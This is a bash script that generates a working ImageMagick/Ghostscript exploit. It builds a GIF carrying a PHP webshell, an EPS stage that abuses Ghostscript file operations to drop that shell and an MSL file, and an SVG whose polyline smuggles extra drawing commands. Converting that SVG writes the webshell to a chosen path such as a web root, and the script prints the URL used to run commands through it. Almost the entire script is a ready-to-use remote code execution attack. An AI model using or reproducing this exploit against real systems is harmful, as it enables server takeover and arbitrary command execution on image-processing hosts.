#!/bin/bash

if [ $# -ne 2 ]; then
  echo "Usage: $0 <linux|windows|mac> <output_path>"
  echo "Example: $0 linux /var/www/html/shell.php"
  exit 1
fi

OS="$1"
OUTPUT_PATH="$2"

case "$OS" in
  linux)
    TMPDIR_ACTUAL="/tmp"
    ;;
  windows)
    TMPDIR_ACTUAL="C:/Windows/Temp"
    ;;
  mac)
    TMPDIR_ACTUAL=$(python3 -c "import tempfile; print(tempfile.gettempdir())")
    ;;
  *)
    echo "[-] Invalid OS. Use: linux, windows, or mac"
    exit 1
    ;;
esac

echo "[*] OS: $OS"
echo "[*] Temp directory: $TMPDIR_ACTUAL"
echo "[*] Output path: $OUTPUT_PATH"

# Build a minimal GIF89a with a PHP webshell embedded in the comment extension block.
# PHP finds and executes <?php ?> tags inside the GIF binary.
WEBSHELL_GIF_HEX=$(python3 -c "
import struct
php = b'<?php system(\$_REQUEST[0]);?>'
gif  = b'GIF89a'
gif += struct.pack('<HH', 1, 1)
gif += bytes([0x80, 0x00, 0x00])
gif += bytes([0xFF, 0x00, 0x00])
gif += bytes([0x00, 0x00, 0x00])
gif += bytes([0x21, 0xFE])
gif += bytes([len(php)]) + php
gif += bytes([0x00])
gif += bytes([0x2C])
gif += struct.pack('<HHHH', 0, 0, 1, 1)
gif += bytes([0x00])
gif += bytes([0x02, 0x02, 0x44, 0x01, 0x00])
gif += bytes([0x3B])
print(gif.hex())
")

# Create EPS payload (runs inside GS SAFER)
# 1. Writes the GIF webshell binary to TMPDIR/webshell via .tempfile + renamefile
# 2. Writes the MSL payload that reads the GIF and writes it to the target path
cat > /tmp/stage1.eps << EPSEOF
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 1 1
null (w) .tempfile /f1 exch def /n1 exch def
f1 <${WEBSHELL_GIF_HEX}> writestring
f1 closefile
n1 (${TMPDIR_ACTUAL}/webshell) renamefile
null (w) .tempfile /f2 exch def /n2 exch def
f2 (<image>\n<read filename="gif:${TMPDIR_ACTUAL}/webshell"/>\n<write filename="gif:${OUTPUT_PATH}"/>\n</image>) writestring
f2 closefile
n2 (${TMPDIR_ACTUAL}/payload.msl) renamefile
1 0 0 setrgbcolor 0 0 1 1 rectfill showpage
EPSEOF

# Base64 encode
B64=$(base64 < /tmp/stage1.eps | tr -d '\n')

# Generate self-contained SVG
cat > /tmp/poc.svg << SVGEOF
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <rect width="200" height="200" fill="white"/>
  <polyline points="0,0 50,50 100,0&#13;image Over 0,0 1,1 'data:image/x-eps;base64,${B64}'&#13;image Over 10,10 100,100 'msl:${TMPDIR_ACTUAL}/payload.msl'"/>
</svg>
SVGEOF

echo "[*] Generated /tmp/poc.svg ($(wc -c < /tmp/poc.svg | tr -d ' ') bytes)"
echo "[*] Run: magick /tmp/poc.svg output.png"
echo "[*] Webshell: ${OUTPUT_PATH}?0=id"
